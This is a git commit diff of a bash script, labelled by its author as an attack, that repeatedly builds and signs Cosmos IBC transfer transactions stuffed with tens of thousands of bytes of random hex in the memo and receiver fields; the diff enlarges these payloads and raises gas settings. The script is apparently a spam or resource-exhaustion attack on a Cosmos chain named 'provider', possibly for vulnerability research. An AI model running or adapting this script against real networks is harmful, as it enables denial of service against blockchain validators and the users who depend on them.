e7e921fecd821de98703f160fab14664f7bef105
Jacob Gadikian <jacobgadikian@gmail.com>
2023-10-12 17:46:44 +0200

    update attack and remove autobanana

--- banattv2.bash
+++ banattv2.bash
@@ -2,13 +2,16 @@ set -ue
 
 
 # Note: each hex is two bytes, 10,000+10,000=40,000.  Gas is 10 per byte, so 400,000 + default tx gas for the ibc send
-SEQUENCE=23814
-IBCMEMO=2000
-RECIEVEADDR=2000
-GAS=183000
+SEQUENCE=303038
+IBCMEMO=30000
+RECIEVEADDR=30000
+GAS=9514074
+ADDRESS=cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq
 CHAINID=provider
-FEES=2000
+FEES=23786
 UDENOM=uatom
+ACCOUNT=490
+HOME="~/.gaia-rs"
 
 
 while true
@@ -18,8 +21,8 @@ do
 echo "sequence number is $SEQUENCE"
 
 # Make a new transaction body with a random string
-gaiad tx ibc-transfer transfer transfer channel-58  cosmos1fjzgfyt8way9sp7hktnv2jv73j697gvz3fyptm 1$UDENOM  --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex $IBCMEMO) --chain-id $CHAINID --yes   --packet-timeout-timestamp 0 --generate-only --fees $FEES$UDENOM --gas $GAS --from cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 &> bareibctx.json
-echo "transaction body generated"
+gaiad tx ibc-transfer transfer transfer channel-58 cosmos1fjzgfyt8way9sp7hktnv2jv73j697gvz3fyptm 1$UDENOM  --keyring-backend test --home $HOME --memo $(openssl rand -hex $IBCMEMO) --chain-id $CHAINID --yes   --packet-timeout-timestamp 0 --generate-only --fees $FEES$UDENOM --gas $GAS --from $ADDRESS &> bareibctx.json
+echo "transaction body generated with $((IBCMEMO*2)) byte ibc memo field"
 
 # Step 1: Generate the random hex string and save it to a temporary file
 openssl rand -hex $RECIEVEADDR > tmp.txt
@@ -27,14 +30,14 @@ echo "random string generated"
 
 # Step 2: Use jq with --arg to set the receiver field
 jq --rawfile random_str tmp.txt '.body.messages[0].receiver = $random_str' bareibctx.json > autobanana.json
-echo "random string inserted"
+echo "$(($RECIEVEADDR*2)) byte random string inserted"
 
 # Step 3: remove the temporary file afterwards
 rm tmp.txt
 echo "temporary file removed"
 
 # Step 4: Sign the transaction
-gaiad tx sign autobanana.json --home /root/.gaia-rs --from cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 --yes --sequence $SEQUENCE --chain-id provider --keyring-backend test --offline --account-number 495 &> ban.json
+gaiad tx sign autobanana.json --home $HOME --from $ADDRESS --yes --sequence $SEQUENCE --chain-id provider --keyring-backend test --offline --account-number $ACCOUNT &> ban.json
 echo "transaction signed"
 
 
